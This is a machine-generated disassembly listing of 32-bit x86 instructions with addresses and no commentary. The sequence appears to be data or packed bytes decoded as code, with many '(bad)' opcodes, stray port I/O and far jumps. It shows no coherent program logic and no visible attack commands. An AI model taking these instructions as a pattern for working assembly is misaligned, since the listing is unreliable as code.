  403677:	add    BYTE PTR [eax+0x3def0000],dh
  40367d:	jns    0x403619
  40367f:	cs stos DWORD PTR es:[edi],eax
  403681:	jbe    0x403701
  403683:	jge    0x4036ff
  403685:	cmc    
  403686:	outs   dx,BYTE PTR ds:[esi]
  403687:	mov    dh,BYTE PTR [ebp+ebx*4+0x70c4ca]
  40368e:	add    BYTE PTR [eax+0xe0c8],dl
  403694:	jne    0x403692
  403696:	imul   edx,DWORD PTR [edx],0x7c65ce33
  40369c:	mov    cl,BYTE PTR [ebx+0x18403efb]
  4036a2:	add    BYTE PTR [eax],al
  4036a4:	pop    ebx
  4036a5:	ja     0x4036b9
  4036a7:	out    0x76,eax
  4036a9:	xor    dh,BYTE PTR [esi-0x2c]
  4036ac:	fs pusha 
  4036ae:	xor    eax,0x36ea1a6e
  4036b3:	jecxz  0x403668
  4036b5:	jge    0x403681
  4036b7:	fcom   QWORD PTR [esp+eiz*4]
  4036ba:	and    BYTE PTR [edx+0x6fcc],cl
  4036c0:	mov    ecx,0x3c0ff678
  4036c5:	int    0x52
  4036c7:	adc    esp,edx
  4036c9:	sbb    bh,BYTE PTR [esi+edx*2+0x3f]
  4036cd:	xchg   DWORD PTR [ecx-0x32],edi
  4036d0:	ja     0x403699
  4036d2:	lds    ebp,FWORD PTR [ebx-0x60be1b2]
  4036d8:	jmp    0x403688
  4036da:	mov    ebp,DWORD PTR ds:0x94b1eaeb
  4036e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036e1:	clc    
  4036e2:	aad    0x12
  4036e4:	xor    edi,DWORD PTR [esi+0x653ae878]
  4036ea:	or     cl,BYTE PTR ds:0x7004f1eb
  4036f0:	add    BYTE PTR [eax],al
  4036f2:	sbb    al,0x27
  4036f4:	push   esp
  4036f5:	adc    eax,0x99f7ffe9
  4036fa:	push   cs
  4036fb:	out    0x3b,eax
  4036fd:	pop    ebx
  4036fe:	stos   DWORD PTR es:[edi],eax
  4036ff:	cmp    al,BYTE PTR [ebx]
  403701:	pop    ebx
  403702:	or     BYTE PTR [edx+0x12560000],bh
  403708:	jae    0x4036f2
  40370a:	jae    0x403692
  40370c:	mov    esp,0x8958de20
  403711:	adc    dh,dh
  403713:	add    eax,0xc2f1d96a
  403718:	lea    edi,ds:0x935c377e
  40371e:	mov    eax,ds:0xbcf82c9e
  403723:	addr16 ja 0x4036e3
  403726:	div    BYTE PTR [eax+0x63]
  403729:	push   0xbf2511f6
  40372e:	fldenv [edi+0x28c4beb7]
  403734:	add    BYTE PTR [eax],al
  403736:	and    BYTE PTR [edx+0x6ee8bae0],cl
  40373c:	cmp    ebx,DWORD PTR [esi]
  40373e:	sbb    BYTE PTR gs:[edx+0x678ab1be],0x28
  403746:	jb     0x4037ae
  403748:	nop
  403749:	pop    ebp
  40374a:	js     0x4037ba
  40374c:	psubusb mm6,QWORD PTR [esi+0xb20526e]
  403753:	xchg   ebx,eax
  403754:	xor    eax,0x39e31a24
  403759:	les    edx,FWORD PTR [edi]
  40375b:	add    BYTE PTR [eax],al
  40375d:	mov    esp,0x59ba5b67
  403762:	outs   dx,BYTE PTR ds:[esi]
  403763:	dec    ebp
  403764:	fld    QWORD PTR [edx+ecx*8+0x6f800000]
  40376b:	add    BYTE PTR [eax],al
  40376d:	add    eax,0x8032cb24
  403772:	std    
  403773:	add    BYTE PTR [eax],al
  403775:	shr    DWORD PTR [ebx-0x7a2d298a],1
  40377b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40377c:	(bad)  
  40377d:	cmp    dh,al
  40377f:	fwait
  403780:	inc    ebx
  403781:	push   edi
  403782:	cmp    cl,BYTE PTR ss:[edi]
  403785:	xor    eax,0x92221f98
  40378a:	sub    DWORD PTR [ebp-0x4f31b207],0xffffff8e
  403791:	fxch   st(4)
  403793:	test   BYTE PTR [eax],al
  403795:	add    BYTE PTR [edx+0xa44462],bl
  40379b:	add    al,dh
  40379d:	mov    al,0x5b
  40379f:	and    ecx,ecx
  4037a1:	push   0xffffffca
  4037a3:	hlt    
  4037a4:	out    0x36,al
  4037a6:	je     0x403824
  4037a8:	ins    BYTE PTR es:[edi],dx
  4037a9:	sbb    dh,ah
  4037ab:	(bad)  
  4037ac:	dec    ebp
  4037ad:	stc    
  4037ae:	fnstenv [eax]
  4037b0:	jae    0x4037c0
  4037b2:	popf   
  4037b3:	push   0xffffffca
  4037b5:	imul   ecx
  4037b7:	test   DWORD PTR [ecx-0xa],esi
  4037ba:	call   0x5bad:0x6706e068
  4037c1:	stos   DWORD PTR es:[edi],eax
  4037c2:	loop   0x403765
  4037c4:	dec    eax
  4037c5:	fadd   DWORD PTR [eax]
  4037c7:	add    BYTE PTR [ecx],bh
  4037c9:	jp     0x403773
  4037cb:	ficom  WORD PTR [eax+0x745f3e42]
  4037d1:	aas    
  4037d2:	imul   esi,DWORD PTR [ebx-0x76],0x13de69e2
  4037d9:	or     al,BYTE PTR [ecx]
  4037db:	dec    ebx
  4037dc:	lods   eax,DWORD PTR ds:[esi]
  4037dd:	mov    ch,BYTE PTR [esi]
  4037df:	inc    edi
  4037e0:	jp     0x4037c6
  4037e2:	and    ebx,DWORD PTR [ebx+0x5d]
  4037e5:	sbb    BYTE PTR [ebp+0x0],0x0
  4037e9:	rcr    DWORD PTR [edi],cl
  4037eb:	mov    ecx,0xc0e0595b
  4037f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037f1:	add    BYTE PTR [eax],al
  4037f3:	and    eax,0x1e438da5
  4037f8:	jmp    0xe3fdf617
  4037fd:	push   edx
  4037fe:	add    esp,DWORD PTR [edx-0x6df51b17]
  403804:	mov    al,0x38
  403806:	out    0xbe,al
  403808:	mov    ecx,0xfd848af5
  40380d:	add    BYTE PTR [eax],al
  40380f:	mov    ecx,0x7a400e
  403814:	add    al,bh
  403816:	retf   
  403817:	inc    edx
  403818:	imul   edi,DWORD PTR [edi],0xffffff86
  40381b:	nop
  40381c:	sub    eax,0x1e809e
  403821:	add    ch,cl
  403823:	lahf   
  403824:	mov    edx,DWORD PTR ss:[edi]
  403827:	inc    eax
  403828:	aas    
  403829:	add    BYTE PTR [eax],al
  40382b:	xchg   ebx,eax
  40382c:	icebp  
  40382d:	(bad)
  403830:	push   esp
  403831:	sti    
  403832:	jae    0x403874
  403834:	fild   WORD PTR [eax]
  403836:	add    ch,dl
  403838:	and    eax,0x97fa9724
  40383d:	mov    ah,0xe2
  40383f:	inc    ebp
  403840:	push   ds
  403841:	mov    edx,0xfd382229
  403846:	stos   DWORD PTR es:[edi],eax
  403847:	ins    DWORD PTR es:[edi],dx
  403848:	pop    edx
  403849:	outs   dx,BYTE PTR ds:[esi]
  40384a:	out    0xcb,al
  40384c:	lods   eax,DWORD PTR ds:[esi]
  40384d:	test   eax,0x9ab1be58
  403852:	jne    0x40384a
  403854:	pusha  
  403855:	mov    ch,0xcb
  403857:	outs   dx,BYTE PTR ds:[esi]
  403858:	popa   
  403859:	mov    BYTE PTR ds:0xbe326d68,0x1c
  403860:	cdq    
  403861:	aam    0x19
  403863:	lock push edi
  403865:	xchg   DWORD PTR [eax-0x6d073d0e],esi
  40386b:	pop    ds
  40386c:	inc    edi
  40386d:	js     0x403821
  40386f:	rol    DWORD PTR [edi-0x77],1
  403872:	xchg   ecx,eax
  403873:	and    BYTE PTR es:[eax-0x5e],ch
  403877:	std    
  403878:	sub    eax,0xd8c5e572
  40387d:	xchg   ebx,eax
  40387e:	mov    ebx,0xc5dab23b
  403883:	cmp    eax,0x3f01936f
  403888:	jae    0x403835
  40388a:	(bad)  
  40388b:	ss jge 0x4038f3
  40388e:	mov    dl,0x47
  403890:	cmp    al,0x67
  403892:	repz aas 
  403894:	push   ecx
  403895:	sub    eax,0x76dec9b8
  40389a:	(bad)  
  40389b:	int    0xef
  40389d:	inc    edx
  40389e:	out    dx,al
  40389f:	sub    al,0x89
  4038a1:	or     dl,bl
  4038a3:	jae    0x403854
  4038a5:	or     ch,BYTE PTR [eax+0x4e41866e]
  4038ab:	leave  
  4038ac:	jl     0x403867
  4038ae:	xchg   esp,eax
  4038af:	cmp    ebx,DWORD PTR [edi-0x3fc4148a]
  4038b5:	loopne 0x4038b7
  4038b7:	add    dl,cl
  4038b9:	fxam   
  4038bb:	push   cs
  4038bc:	mov    DWORD PTR [esi+0x3682cb55],ebp
  4038c2:	out    dx,al
  4038c3:	dec    ebx
  4038c4:	out    0x37,eax
  4038c6:	shl    BYTE PTR [ebx+ebx*8+0x39a7b256],cl
  4038cd:	(bad)  
  4038ce:	cmp    al,0x4b
  4038d0:	inc    ebp
  4038d1:	fwait
  4038d2:	mov    ah,0x4b
  4038d4:	(bad)  
  4038d5:	mov    ebx,0x88bf0183
  4038da:	imul   eax,DWORD PTR [eax],0xc1e3dc00
  4038e0:	ins    BYTE PTR es:[edi],dx
  4038e1:	int3   
  4038e2:	fadd   DWORD PTR [eax]
  4038e4:	add    ch,bh
  4038e6:	cmp    bl,BYTE PTR [eax]
  4038e8:	dec    esp
  4038e9:	retf   0x0
  4038ec:	mov    al,0x37
  4038ee:	pop    esi
  4038ef:	sub    BYTE PTR [edx],bl
  4038f1:	js     0x4038b0
  4038f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038f4:	ins    BYTE PTR es:[edi],dx
  4038f5:	fwait
  4038f6:	jecxz  0x4038da
  4038f8:	cmp    al,0x3f
  4038fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038fb:	cmp    al,0x16
  4038fd:	dec    esp
  4038fe:	aaa    
  4038ff:	add    BYTE PTR [eax],al
  403901:	or     BYTE PTR [eax+eax*1+0x0],0x4e
  403906:	xchg   ebx,eax
  403907:	sub    eax,0x9b7385ea
  40390c:	jns    0x403974
  40390e:	push   0x46ea9786
  403913:	pop    es
  403914:	out    dx,al
  403915:	in     eax,0x17
  403917:	sbb    ecx,DWORD PTR [edi]
  403919:	pop    esp
  40391a:	sbb    DWORD PTR [ecx],0xd70ce95
  403920:	loopne 0x4038eb
  403922:	dec    eax
  403923:	or     DWORD PTR [eax],eax
  403925:	add    BYTE PTR [ebp+0x5f],al
  403928:	loope  0x4038b4
  40392a:	popf   
  40392b:	xchg   ebx,eax
  40392c:	leave  
  40392d:	int3   
  40392e:	pop    esp
  40392f:	add    BYTE PTR [eax],al
  403931:	jno    0x4038ce
  403933:	loope  0x40395a
  403935:	or     eax,0x21ee6091
  40393a:	outs   dx,DWORD PTR ds:[esi]
  40393b:	retf   
  40393c:	adc    dh,BYTE PTR [esi+0x56]
  40393f:	push   esp
  403940:	fucomip st,st(0)
  403942:	gs pop ebx
  403944:	jo     0x40391c
  403946:	xchg   edx,eax
  403947:	test   DWORD PTR [edi],edx
  403949:	add    BYTE PTR [edx],ch
  40394b:	add    BYTE PTR [eax],al
  40394d:	ss jne 0x40390f
  403950:	outs   dx,BYTE PTR ds:[esi]
  403951:	xchg   edi,eax
  403952:	outs   dx,BYTE PTR ds:[esi]
  403953:	add    eax,0x59c92776
  403958:	js     0x4039ce
  40395a:	leave  
  40395b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40395c:	dec    ebp
  40395d:	inc    ebp
  40395e:	xchg   BYTE PTR [edi],ch
  403960:	jp     0x403951
  403962:	and    DWORD PTR [ebx+edi*8-0x29eeed95],ebp
  403969:	xor    eax,eax
  40396b:	test   DWORD PTR [eax],eax
  40396d:	add    bl,ah
  40396f:	shr    cl,0x0
  403972:	add    BYTE PTR [edx],ch
  403974:	shl    DWORD PTR [edi+0x1c],cl
  403977:	aas    
  403978:	arpl   WORD PTR [edx-0x6c],bx
  40397b:	pop    ecx
  40397c:	stos   BYTE PTR es:[edi],al
  40397d:	mov    ch,0x5e
  40397f:	iret   
  403980:	hlt    
  403981:	xlat   BYTE PTR ds:[ebx]
  403982:	(bad)  
  403983:	push   ebp
  403984:	mov    eax,0x27d7b1de
  403989:	jg     0x4039fc
  40398b:	dec    esi
  40398c:	sar    BYTE PTR [edi+0x32],1
  40398f:	jge    0x403a00
  403991:	and    BYTE PTR [edx-0x58],al
  403994:	mov    ah,0x48
  403996:	inc    ebx
  403997:	add    BYTE PTR [eax],al
  403999:	mov    ebp,0xeb652f6d
  40399e:	aam    0xac
  4039a0:	js     0x403a21
  4039a2:	sar    al,cl
  4039a4:	stos   BYTE PTR es:[edi],al
  4039a5:	lods   eax,DWORD PTR ds:[esi]
  4039a6:	dec    esi
  4039a7:	retf   
  4039a8:	push   esi
  4039a9:	mov    dl,0x1d
  4039ab:	mov    BYTE PTR [ebp+0x743cdd8e],0x4d
  4039b2:	popf   
  4039b3:	push   ebp
  4039b4:	xor    DWORD PTR [eax+0x0],eax
  4039b7:	add    BYTE PTR [eax],al
  4039b9:	jnp    0x40396a
  4039bb:	mov    edi,0x1affc576
  4039c0:	jno    0x403a25
  4039c2:	sti    
  4039c3:	and    eax,0x4eb5f9c1
  4039c9:	push   0x20ff5ecf
  4039ce:	inc    ebp
  4039cf:	out    dx,eax
  4039d0:	add    al,BYTE PTR [esi+0x56]
  4039d3:	sbb    eax,0x3e8952db
  4039d8:	dec    esi
  4039d9:	outs   dx,DWORD PTR ds:[esi]
  4039da:	data16 jns 0x403977
  4039dd:	jmp    DWORD PTR [edi]
  4039df:	es jmp 0x154:0x5e4ad28a
  4039e7:	or     al,0x8d
  4039e9:	add    BYTE PTR [eax],al
  4039eb:	fild   QWORD PTR [ecx+esi*1]
  4039ee:	mov    esi,0x4cecb92b
  4039f3:	rol    BYTE PTR [eax],cl
  4039f5:	add    BYTE PTR [ebp+0x67c805],bh
  4039fb:	add    ah,cl
  4039fd:	repz add BYTE PTR [eax],al
  403a00:	test   DWORD PTR [ecx-0x398e8945],ebx
  403a06:	sub    al,BYTE PTR [eax]
  403a08:	in     al,0x0
  403a0a:	add    BYTE PTR [ebx+esi*1-0xf07e9c2],dh
  403a11:	in     al,0xdb
  403a13:	jo     0x403a3d
  403a15:	mov    al,0xf9
  403a17:	cmp    edi,DWORD PTR [ebp-0x2c]
  403a1a:	loope  0x403a1c
  403a1c:	pop    ecx
  403a1d:	add    BYTE PTR [eax],al
  403a1f:	add    esp,DWORD PTR [eax+0x36]
  403a22:	adc    BYTE PTR cs:[edx],bh
  403a25:	data16 adc BYTE PTR [esi-0x55],0x81
  403a2a:	sub    esp,ecx
  403a2c:	aaa    
  403a2d:	dec    esi
  403a2e:	ja     0x403a43
  403a30:	pop    esi
  403a31:	mov    ds:0x61fe262,eax
  403a36:	mov    al,ds:0x4e8aa16a
  403a3b:	mov    bh,BYTE PTR [ecx+0x75]
  403a3e:	pop    edi
  403a3f:	rcl    BYTE PTR [ebx+0x0],0x0
  403a43:	xchg   DWORD PTR [esi-0x58],edi
  403a46:	jge    0x403a3d
  403a48:	rcr    BYTE PTR [eax+0x1b051a10],cl
  403a4e:	pop    ebp
  403a4f:	push   ebx
  403a50:	cli    
  403a51:	mov    ds:0xe82a71ba,al
  403a56:	xor    al,0x37
  403a58:	arpl   ax,ax
  403a5a:	rol    BYTE PTR [eax],cl
  403a5c:	add    BYTE PTR [edi],bh
  403a5e:	imul   edi,DWORD PTR [ebx+0x10694eea],0x3542c72b
  403a68:	dec    esi
  403a69:	leave  
  403a6a:	cmp    edx,DWORD PTR [ecx+0x2b29f07c]
  403a70:	mov    dl,0xf1
  403a72:	loopne 0x403a0e
  403a74:	mov    ss:0x2a167abd,al
  403a7a:	xchg   edi,eax
  403a7b:	push   ebp
  403a7c:	je     0x4039fe
  403a7e:	fwait
  403a7f:	add    BYTE PTR [eax],al
  403a81:	sub    dh,BYTE PTR [edx-0x5f]
  403a84:	inc    ebp
  403a85:	jg     0x403a32
  403a87:	es pushfw 
  403a8a:	mov    ebp,0x3d8368a8
  403a8f:	jle    0x403b07
  403a91:	and    DWORD PTR [ecx+0x7d],eax
  403a94:	dec    eax
  403a95:	mov    WORD PTR [eax],es
  403a97:	add    BYTE PTR [ecx],ch
  403a99:	retf   
  403a9a:	ins    BYTE PTR es:[edi],dx
  403a9b:	jg     0x403a46
  403a9d:	and    DWORD PTR [ebp+0x60],0x14
  403aa1:	mov    cl,0x38
  403aa3:	psraw  mm1,QWORD PTR [ebp+eiz*8+0x6ee60000]
  403aab:	daa    
  403aac:	add    cl,bl
  403aae:	add    BYTE PTR [eax],al
  403ab0:	jecxz  0x403abf
  403ab2:	and    edi,ebx
  403ab4:	sub    ah,BYTE PTR [ebx]
  403ab6:	ss pop edi
  403ab8:	mov    esi,0x2218e3f0
  403abd:	inc    edx
  403abe:	test   eax,0xe93b2781
  403ac3:	and    DWORD PTR ds:0xc92ad054,edx
  403ac9:	lock arpl WORD PTR [esi-0x7e],cx
  403acd:	pop    ds
  403ace:	sub    BYTE PTR [ebp+esi*1-0x2d],bl
  403ad2:	cdq    
  403ad3:	out    0x61,al
  403ad5:	jbe    0x403b48
  403ad7:	inc    esi
  403ad8:	test   BYTE PTR [esi],ah
  403ada:	add    BYTE PTR [eax],al
  403adc:	and    esp,ebp
  403ade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403adf:	and    al,0xd6
  403ae1:	or     esi,edi
  403ae3:	sti    
  403ae4:	and    al,0x73
  403ae6:	test   eax,0xecb93030
  403aeb:	push   edx
  403aec:	cwde   
  403aed:	pop    es
  403aee:	sub    eax,0x6dcffcaf
  403af3:	mov    ds:0x40330bd9,al
  403af8:	outs   dx,BYTE PTR ds:[esi]
  403af9:	add    BYTE PTR [eax],al
  403afb:	(bad)  
  403afc:	xor    eax,0xcc8d297c
  403b01:	add    BYTE PTR ss:[eax],al
  403b04:	jp     0x403b35
  403b06:	inc    eax
  403b07:	iret   
  403b08:	add    BYTE PTR [eax],al
  403b0a:	push   edx
  403b0b:	xlat   BYTE PTR ds:[ebx]
  403b0c:	sti    
  403b0d:	mov    al,0xb1
  403b0f:	daa    
  403b10:	or     BYTE PTR [edx+0x0],ah
  403b13:	add    BYTE PTR [edx],bl
  403b15:	adc    ch,BYTE PTR [ebp-0x50f75f09]
  403b1b:	add    BYTE PTR [eax],al
  403b1d:	sti    
  403b1e:	push   ds
  403b1f:	stos   DWORD PTR es:[edi],eax
  403b20:	pop    edi
  403b21:	or     eax,0xee07a636
  403b26:	push   esi
  403b27:	stos   BYTE PTR es:[edi],al
  403b28:	ins    BYTE PTR es:[edi],dx
  403b29:	xor    DWORD PTR ds:[ecx-0x7fc1a183],ebp
  403b30:	retf   0x0
  403b33:	cmc    
  403b34:	inc    esp
  403b35:	popa   
  403b36:	add    BYTE PTR [eax],al
  403b38:	xchg   esp,eax
  403b39:	jno    0x403b5c
  403b3b:	lea    esp,[ebx]
  403b3d:	(bad)  
  403b3f:	and    BYTE PTR [ebx-0x42],bh
  403b42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b43:	sbb    DWORD PTR [ebp-0x72],edi
  403b46:	in     eax,dx
  403b47:	retf   
  403b48:	push   es
  403b49:	sub    esp,DWORD PTR [ebx]
  403b4b:	dec    ebx
  403b4c:	jb     0x403b9f
  403b4e:	pop    edi
  403b4f:	std    
  403b50:	fild   DWORD PTR gs:[eax-0x74ffff1c]
  403b57:	je     0x403ba3
  403b59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b5a:	cli    
  403b5b:	lock lods eax,DWORD PTR ds:[esi]
  403b5d:	cmp    eax,0x17a1f5c2
  403b62:	ja     0x403af4
  403b64:	inc    ecx
  403b65:	cmp    bh,dh
  403b67:	xor    al,0xca
  403b69:	sbb    al,0xe7
  403b6b:	ins    DWORD PTR es:[edi],dx
  403b6c:	pop    edx
  403b6d:	fstp   DWORD PTR [ebx-0x42]
  403b70:	and    BYTE PTR [eax],ah
  403b72:	nop
  403b73:	ja     0x403b5b
  403b75:	cmp    ebp,DWORD PTR [ebx]
  403b77:	cwde   
  403b78:	int    0xb7
  403b7a:	xlat   BYTE PTR ds:[ebx]
  403b7b:	int3   
  403b7c:	mov    al,0x0
  403b7e:	add    bl,ah
  403b80:	out    0x85,al
  403b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b83:	leave  
  403b84:	cmp    ebx,DWORD PTR [eax-0x25]
  403b87:	pushf  
  403b88:	or     ecx,DWORD PTR [edx-0x47801d48]
  403b8e:	add    edx,ebx
  403b90:	inc    dl
  403b92:	add    eax,0xc26f37af
  403b97:	mov    ds:0x25fbf53b,al
  403b9c:	add    eax,0xa1bf168b
  403ba1:	jb     0x403baf
  403ba3:	sti    
  403ba4:	add    BYTE PTR [eax],al
  403ba6:	loop   0x403bdc
  403ba8:	adc    al,0x80
  403baa:	mov    ebp,0xe6310000
  403baf:	jbe    0x403bd9
  403bb1:	adc    BYTE PTR [ebx+0x3a],bh
  403bb4:	repz (bad) 
  403bb6:	xor    ah,BYTE PTR [ebx-0x4b]
  403bb9:	xlat   BYTE PTR ds:[ebx]
  403bba:	std    
  403bbb:	loop   0x403b96
  403bbd:	shl    BYTE PTR [esi+0x52816bf6],1
  403bc3:	ret    0x3771
  403bc6:	and    ah,BYTE PTR [ecx]
  403bc8:	ss loopne 0x403bd1
  403bcb:	add    ecx,DWORD PTR [edx-0xf]
  403bce:	adc    DWORD PTR [ebp-0x5cad3e13],esi
  403bd4:	fcom   DWORD PTR ds:0x33f7623e
  403bda:	ins    DWORD PTR es:[edi],dx
  403bdb:	mov    bl,0x39
  403bdd:	push   eax
  403bde:	int3   
  403bdf:	test   BYTE PTR [eax],al
  403be1:	add    bl,ch
  403be3:	xchg   esp,eax
  403be4:	fidivr WORD PTR [edi+0x6393795a]
  403bea:	lods   eax,DWORD PTR ds:[esi]
  403beb:	cwde   
  403bec:	(bad)  
  403bed:	out    dx,al
  403bee:	sbb    BYTE PTR [ebp+0x9ec5e9d],bl
  403bf4:	dec    ebp
  403bf5:	jmp    0x403c1c
  403bf7:	mov    ah,0x91
  403bf9:	sub    cl,BYTE PTR [ecx+0x7f36b3fe]
  403bff:	add    cl,BYTE PTR [ebp-0x4f]
  403c02:	xchg   ebx,eax
  403c03:	(bad)  
  403c05:	scas   al,BYTE PTR es:[edi]
  403c06:	mov    ds:0xb6cc9f,eax
  403c0b:	add    BYTE PTR [ebx],bh
  403c0d:	cdq    
  403c0e:	imul   edi,DWORD PTR [edx],0xffffffb1
  403c11:	bnd jo 0x403c76
  403c14:	xor    DWORD PTR [ebp+0x7b],edx
  403c17:	rcr    BYTE PTR [esi],1
  403c19:	fsub   DWORD PTR [edi+ebx*2+0x7]
  403c1d:	(bad)  
  403c1e:	stos   BYTE PTR es:[edi],al
  403c1f:	adc    eax,0xd0949622
  403c24:	ret    0xa8dd
  403c27:	mov    WORD PTR [edx+0x2f3c0000],fs
  403c2d:	mov    dl,0x5e
  403c2f:	aas    
  403c30:	lods   eax,DWORD PTR ds:[esi]
  403c31:	scas   al,BYTE PTR es:[edi]
  403c32:	jno    0x403c3f
  403c34:	lahf   
  403c35:	jbe    0x403c95
  403c37:	cdq    
  403c38:	pop    ss
  403c39:	xchg   edi,eax
  403c3a:	jae    0x403c73
  403c3c:	sbb    DWORD PTR ds:0x25e5a46f,ebp
  403c42:	fs leave 
  403c44:	ds add al,0x72
  403c47:	add    BYTE PTR [eax],al
  403c49:	mov    dh,0xda
  403c4b:	and    dl,bh
  403c4d:	fdivr  DWORD PTR [ecx-0x1780017e]
  403c53:	popf   
  403c54:	popa   
  403c55:	ret    0x74b
  403c58:	jb     0x403c57
  403c5a:	pop    es
  403c5b:	clc    
  403c5c:	arpl   WORD PTR [ebx],sp
  403c5e:	out    dx,eax
  403c5f:	loop   0x403beb
  403c61:	push   esp
  403c62:	pop    ebx
  403c63:	jl     0x403c95
  403c65:	gs xchg esi,eax
  403c67:	test   esi,edi
  403c69:	adc    eax,0x4dd7da26
  403c6e:	cmp    ebp,DWORD PTR [ebx-0x4f]
  403c71:	inc    ebx
  403c72:	scas   al,BYTE PTR es:[edi]
  403c73:	inc    ebx
  403c74:	and    BYTE PTR [eax],bl
  403c76:	daa    
  403c77:	les    ebp,FWORD PTR [edx]
  403c79:	add    BYTE PTR [eax],al
  403c7b:	jne    0x403c98
  403c7d:	cmc    
  403c7e:	or     DWORD PTR ds:0x72b2b2ec,edx
  403c84:	test   DWORD PTR [ebp+0x73],0xe4a57c6e
  403c8b:	ja     0x403c77
  403c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c8e:	ret    
  403c8f:	(bad)  
  403c90:	adc    al,0x5a
  403c92:	pop    edx
  403c93:	xor    bl,dl
  403c95:	inc    ebx
  403c96:	std    
  403c97:	sti    
  403c98:	push   edx
  403c99:	mov    ds:0x3ba9fc59,eax
  403c9e:	add    BYTE PTR ds:[eax+eax*1+0x0],ch
  403ca3:	sub    bl,ah
  403ca5:	and    DWORD PTR [eax-0x11010167],ebx
  403cab:	addr16 jge 0x403ce0
  403cae:	inc    eax
  403caf:	pop    es
  403cb0:	add    BYTE PTR [eax],al
  403cb2:	push   esp
  403cb3:	icebp  
  403cb4:	push   edi
  403cb5:	and    dh,BYTE PTR [eax-0x60d5aef2]
  403cbb:	int    0x68
  403cbd:	push   edx
  403cbe:	pushf  
  403cbf:	and    ebp,DWORD PTR [edi-0x16]
  403cc2:	jae    0x403c69
  403cc4:	jbe    0x403cf0
  403cc6:	pushf  
  403cc7:	jge    0x403ccb
  403cc9:	adc    eax,eax
  403ccb:	xchg   DWORD PTR [eax],eax
  403ccd:	add    BYTE PTR [esi],dh
  403ccf:	push   esp
  403cd0:	lea    ecx,[edx]
  403cd2:	and    edi,DWORD PTR [edx-0x21dd6508]
  403cd8:	ja     0x403d22
  403cda:	xlat   BYTE PTR ds:[ebx]
  403cdb:	add    BYTE PTR [eax],al
  403cdd:	xchg   BYTE PTR [edx+0x25],bl
  403ce0:	sub    esp,esi
  403ce2:	ins    BYTE PTR es:[edi],dx
  403ce3:	adc    al,0x77
  403ce5:	in     eax,dx
  403ce6:	push   edi
  403ce7:	stos   BYTE PTR es:[edi],al
  403ce8:	mov    ebp,0xe09f5f26
  403ced:	jno    0x403c87
  403cef:	outs   dx,DWORD PTR ds:[esi]
  403cf0:	ja     0x403cca
  403cf2:	push   edi
  403cf3:	mov    ah,0xe
  403cf5:	mov    bl,0xcc
  403cf7:	sahf   
  403cf8:	add    BYTE PTR [eax],al
  403cfa:	and    al,BYTE PTR [eax]
  403cfc:	or     al,BYTE PTR [eax]
  403cfe:	add    bh,ch
  403d00:	(bad)  
  403d01:	fiadd  DWORD PTR [eax]
  403d03:	add    BYTE PTR [esi],ch
  403d05:	push   0xdb70bfa3
  403d0a:	out    0x66,eax
  403d0c:	and    BYTE PTR [ecx],dh
  403d0e:	in     al,dx
  403d0f:	retf   0x8416
  403d12:	test   BYTE PTR [eax],0x0
  403d15:	pop    ecx
  403d16:	xchg   DWORD PTR [ebx+0x6b3a27d3],esp
  403d1c:	push   edi
  403d1d:	and    eax,0xcd3fa268
  403d22:	sbb    dl,BYTE PTR [ebx+0x18567a8]
  403d28:	mov    ax,0x623b
  403d2c:	int3   
  403d2d:	xor    eax,DWORD PTR [eax]
  403d2f:	add    BYTE PTR [ecx+0x5c],dh
  403d32:	jb     0x403d96
  403d34:	fadd   QWORD PTR [esi-0x6db34d5c]
  403d3a:	add    BYTE PTR [eax],al
  403d3c:	sti    
  403d3d:	jns    0x403d61
  403d3f:	and    ch,BYTE PTR [edi-0x55]
  403d42:	clc    
  403d43:	and    ch,al
  403d45:	daa    
  403d46:	sub    al,0xc9
  403d48:	push   eax
  403d49:	and    edi,DWORD PTR [esi]
  403d4b:	fistp  QWORD PTR [esp+esi*1]
  403d4e:	and    dh,al
  403d50:	jo     0x403cd5
  403d52:	popa   
  403d53:	jae    0x403dc7
  403d55:	inc    edx
  403d56:	lock out 0x44,al
  403d59:	mov    edx,0x4a8e0000
  403d5e:	jecxz  0x403dd9
  403d60:	jno    0x403d3e
  403d62:	es push 0xbfad4f5e
  403d68:	mov    al,ds:0xe304e67f
  403d6d:	add    BYTE PTR [eax],al
  403d6f:	nop
  403d70:	gs mov edi,0xaf9df749
  403d76:	loope  0x403da9
  403d78:	shl    dl,1
  403d7a:	(bad)  
  403d7b:	stos   BYTE PTR es:[edi],al
  403d7c:	(bad)  [edi]
  403d7e:	sbb    bl,0x92
  403d81:	mov    esi,0xbb5f7d1d
  403d86:	lock and dh,BYTE PTR [esi-0x37713a55]
  403d8d:	ins    BYTE PTR es:[edi],dx
  403d8e:	add    BYTE PTR [eax],al
  403d90:	pop    ecx
  403d91:	add    eax,0x364034
  403d96:	add    BYTE PTR [ebx+0x7f],ah
  403d99:	jae    0x403dab
  403d9b:	call   0xe683e26d
  403da0:	and    DWORD PTR [ebx-0x7c3d1915],edi
  403da6:	push   es
  403da7:	in     al,0xd9
  403da9:	sbb    al,BYTE PTR [ebp+0x3d8a1925]
  403daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403db0:	sar    dl,1
  403db2:	and    eax,0xeab369e7
  403db7:	cmp    al,0x6
  403db9:	inc    ebx
  403dba:	(bad)  
  403dbb:	ficom  DWORD PTR [ecx]
  403dbd:	jae    0x403ded
  403dbf:	std    
  403dc0:	push   esp
  403dc1:	call   0x2671:0x725c2611
  403dc8:	lds    esi,FWORD PTR [edi+0x67e32728]
  403dce:	jnp    0x403e46
  403dd0:	ds jb  0x403d99
  403dd3:	inc    edi
  403dd4:	mov    ebp,0xc60064
  403dd9:	add    dl,ah
  403ddb:	mov    DWORD PTR [edi],0x556f21ca
  403de1:	outs   dx,BYTE PTR ds:[esi]
  403de2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403de3:	jl     0x403d71
  403de5:	mov    esp,0x25210000
